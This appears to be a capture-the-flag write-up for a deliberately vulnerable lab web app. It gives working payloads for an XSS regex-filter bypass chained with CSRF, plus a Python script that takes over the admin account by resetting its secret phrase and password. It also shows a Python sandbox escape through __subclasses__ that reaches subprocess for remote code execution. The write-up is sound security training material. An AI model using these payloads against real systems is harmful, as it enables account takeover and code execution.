# 1- Authentication Bypass

## 1.1 - XSS (Cross Site Scripting) chained with CSRF (Cross Site Request Forgery)

In `/api`, the q parameter is vulnerable against XSS :

<img width="525" alt="image" src="https://user-images.githubusercontent.com/76447395/165274658-7a08b203-4e87-4d0a-b4a0-7e2718f9e4a3.png">

But there is a filter we have to bypass, 

```js
const re = new RegExp(/(\b)(on\S+)(\s*)=|javascript:|(<\s*)(\/*)script|style(\s*)=|(<\s*)meta/ig);
function cleanStr(s) {
    return s.replaceAll(re, '');
}
```

The server is using Regular Expressions to match possible XSS payloads, and the match is replaced with an empty string. Let's see how the following payload is matched :

`<img src=x onerror=alert(1)>`
<img width="689" alt="image" src="https://user-images.githubusercontent.com/76447395/165275881-411bcffc-fa96-4f46-a719-14d144f1bc5b.png">

But this can be easily bypassed using the following payload :

`<img src=x o<scriptnerror=alert(1)>`

<img width="468" alt="image" src="https://user-images.githubusercontent.com/76447395/165277057-b48aa5a1-548d-4dd0-bd45-b0fd6d68e35f.png">

This is due to the fact that the RegEx matches `<script` and replaces it with an empty string and the final payload will be :

`<img src=x onerror=alert(1)>`

When we login as the admin we see this :

<img width="719" alt="image" src="https://user-images.githubusercontent.com/76447395/165279081-3148a416-c57b-4e89-9c15-2378aff3e807.png">

So we have to change the SecretPhrase and then the Password, in my case I built a script for this :

```py
import requests
passw = "tkt"
url = "http://172.17.0.2:5000/"
data = {"name": "test4", 
        "email": "test4@test.test", 
        "website": 
f"http://172.17.0.2:5000/api?q=%3Cimg+src%3Dx+o%3Cscriptnerror%3D%22fetch%28%27http%3A%2F%2F172.17.0.2%3A5000%2Fchange_secret_phrase%27%2C+%7Bmethod%3A+%27POST%27%2Cheaders%3A+%7B%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Cbody%3A+%27secret_phrase%3Dbamba%26secret_phrase2%3Dbamba%27%7D%29%3Bfetch%28%27http%3A%2F%2F172.17.0.2%3A5000%2Fchange_password%27%2C+%7Bmethod%3A+%27POST%27%2Cheaders%3A+%7B%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Cbody%3A+%27secret_phrase%3Dbamba%26password%3D{passw}%26password2%3D{passw}%27%7D%29%3B%22%3E", 
        "secret_phrase": "foo", 
        "password": "foo",
        "password2": "foo"}

requests.post(url+"apply", data=data)
```

# 2- RCE (Remote Code Execution)

## 2.1- Python Code Injection

We have an online python compiler :

<img width="886" alt="image" src="https://user-images.githubusercontent.com/76447395/165282766-8e9950e5-6f98-436d-b984-af0498c86211.png">

In `app.py` we can see a blacklist of words we can use, so we can use builtin classes to execute code, first of all we have to check the `subprocess` class :

```py
print(''.__class__.mro()[1].__subclasses__())
```

<img width="1128" alt="image" src="https://user-images.githubusercontent.com/76447395/165287900-2187408b-50b7-45ca-9df9-db94fd2826dd.png">

Nice! It's located in the position 349, let's try to execute code :

```py
print(''.__class__.mro()[1].__subclasses__()[349]('whoami',shell=True,stdout=-1).communicate()[0].strip())
```

<img width="1113" alt="image" src="https://user-images.githubusercontent.com/76447395/165288058-5eeae439-af6a-4ae0-a3d1-91f04b5a9df8.png">
